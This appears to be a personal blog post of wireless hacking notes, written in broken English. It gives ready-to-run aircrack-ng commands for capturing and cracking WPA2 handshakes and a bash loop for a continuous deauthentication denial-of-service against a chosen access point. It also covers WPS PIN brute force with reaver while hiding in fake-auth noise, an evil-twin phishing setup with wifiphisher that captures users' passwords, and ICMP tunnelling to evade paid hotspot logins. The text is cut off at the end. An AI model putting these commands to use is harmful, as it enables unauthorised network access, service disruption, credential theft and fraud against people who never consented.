---
layout: post
title: "Wifi-hacking"
categories: Guides
tags: wifi hacking-wifi
---
https://www.hackers-arise.com/wireless-hacks

# Wireless hacking
This is going to be a guide like to come when you (8)or me) needs to do an auditoring related with WIFI
## What do we need?
- Adapter WIFI with the possibility to put it in monitor mode
- iwconfig: To check the hardwares with wireless support
- airmon-ng that allows us to get packets in promiscuous mode
```
airmon-ng start wlan0
```
- airodump-ng: Belonged to the aircrack-ng allows us capture packets under our specifications
```
airodump-ng mon0** (or wlan0mon) 
```
- aircrack-ng: Used for password cracking of WEP and dictionary cracks for WPA and WPA2 after capturing WPA handshake
- aireplay-ng: Specially useful for **deauth** attacks. Aireplay can get packets from two sources: 
	 1.  **A live stream of packets, or**
	 2. **A pre-captured pcap file**

Until here the main tools, the next are for support:
- airdecap-ng: Allow us decrypt the traffic after crack the key to have access to the traffic without being connected
- airtun-ng: A virtual tunnel interface creator that we could use to connect to an IDS
- airolib-ng: Stores the ESSID's and password list that will be used for the WPA/WPA2 cracking
- airbase-ng: Enables us use our device as an AP, this means that we attack to the users not to the AP itself

## Cracking WPA2-PSK using aircrack-ng
The weakness of WPA2-PSK systems relies in share the password in what is know as "the 4 ways hand-shake", when a user identify agains a AP is done through  4 steps, if we can get the password at that time we can attempt to crack it.
![[Pasted image 20211013223203.png]]

As a note I'm going to denote wlan0 as the generic receptor but probably in your computer have another name, you can just check what do you want to use with `iwconfig`

Starting with the attack
```
# Setup the monitor mode
airmon-ng start wlan0

# Capture traffic
airodump-ng wlan0 (After put the device in monitor mode maybe the name was changed for mon0 or wlan0mon just check again the interfaces with ifconfig)

#Focus the attention in one AP
airodump-ng --bssid 58:8B:F3:E6:18:77 -c 11 --write WPAcrack mon0
# In the file WPAcrack is the file we want to generate with the handshakes

# Open another terminal and now let's deauthenticate all the users connected to the AP sending 100 deatuh frames in this case
aireplay-ng --deauth 100 -a 58:8B:F3:E6:18:77 mon0
```
At this point after deauth the users the terminal with airodump-ng working should capture some "WPA handshake". This is the first challenge.

Now we have the encrypted password in the WPAcrack file, working in Kali Linux that we have rock-you.txt we could:
```
locate wordlist

aircrack-ng WPAcrack-01.cap -w /usr/share/wordlists/rockyou.txt
```

If you want to create your own dictionary custom for different situations you ca use crunch

## Continuous DoSing a Wireless AP
Let's keep a continuous DoS attack to som AP to avoid that someone can use any WIFI (even if we don't know the passphrase)
```
airmon-ng start wlan0

#Get the parameters
airodump-ng wlan0mon
```
Whe you identify the AP target just get the MAC address belonged to it (for example 78:CD:8E:3B:B7:08)
And now write a bash script to keep the continuous deauth attack
```bash
#!/bin/bash

for i in {1..5000}
do
	aireplay-ng -deauth 1000 -a 78:CD:8E:3B:B7:08 wlan0mon
	sleep 60s
done
```

## WPS Pin with Reaver
First, how can we recognize if WPA is active?
```
#Put in monitor mode
airmon.ng start wlan0
#With this command recognize is some net in the scope have WPS enabled
wash -i wlan0mon
```
![[Pasted image 20211015182948.png]]

And having already localized the BSSID with WPS enabled just execute

For avoiding be identified in the attack you could try execute several fake authentication to be lose in the noise
```
#Tes 30 fake authentications each second
aireplay-ng -- fakeauth 30 -a [Target device’s MAC] -h [Network interface’s MAC] [Name of network interface]
```

```
reaver --bssid [Target device’s MAC] --channel [Target device’s channel] --interface [Name of network interface] -vvv --no-associate
```

And that way if you find some network with WPS enabled and active you can get access just testing 11.000 test

## Hacking WPA-PSK without cracking a password
For this pupose let's go to use **Wifiphiser**

The idea is simple:
- Create a evil  twin AP
- Deauthenticate the users from the AP target
- Make them "re-authenticaed" in the evil one
- In a web browser offer a webpage that ask for reáuthenticate
- You take the password that the users enter

This attack need two wireless adapters and one of then must be able of packet injection.

#### Wifiphiser
Download it from github
https://github.com/wifiphisher/wifiphisher
https://github.com/wifiphisher/wifiphisher/releases/tag/v1.4

Or even better jsut clone the repository
```
git clone https://github.com/wifiphisher/wifiphisher
cd wifiphiser

python wifiphiser.py
>> Request you install hostapd, jsut do it and execute again wifiphiser.py
```

This tool create the AP point  show you the AP that are in the scope to attack and do practily every for you.


## Evading WIFI authentication
https://www.hackers-arise.com/evading-wireless-authentication

In several hotels, restaurants, airports there are a "open" SSID where we can connect but after that we are redircted to a proxy that make us authenticate in a web interface.

To avoid pay for use internet we sometimes could evading wireless authentication with ICMPX.

Just check if you can use ICMP with the webpage you want to visit:
`ping www.google.com`
Then you can navigate using this SSID.

In kali install icmptx
```
kali > apt-get install icmptx
```

Now you have to set up a proxy server between you and the page you want to visit
```
icmptx -s ip_to_visit
```
The next step is create a tunnel